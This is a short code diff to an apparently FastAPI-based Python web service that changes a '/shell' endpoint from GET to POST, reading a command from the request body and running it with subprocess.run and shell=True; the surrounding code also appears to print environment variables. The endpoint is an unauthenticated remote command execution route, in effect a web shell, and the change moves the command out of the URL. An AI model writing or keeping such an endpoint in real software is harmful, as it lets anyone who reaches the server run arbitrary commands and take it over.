@@ -18,8 +18,10 @@ print_env_vars()
 async def index():
     return "hello world"
 
-@app.get("/shell")
-async def shell(cmd: str):
+@app.post("/shell")
+async def shell(request: Request):
+    body = await request.body()
+    cmd = body.decode("utf-8").strip()
     result = subprocess.run(
         cmd,
         shell=True,
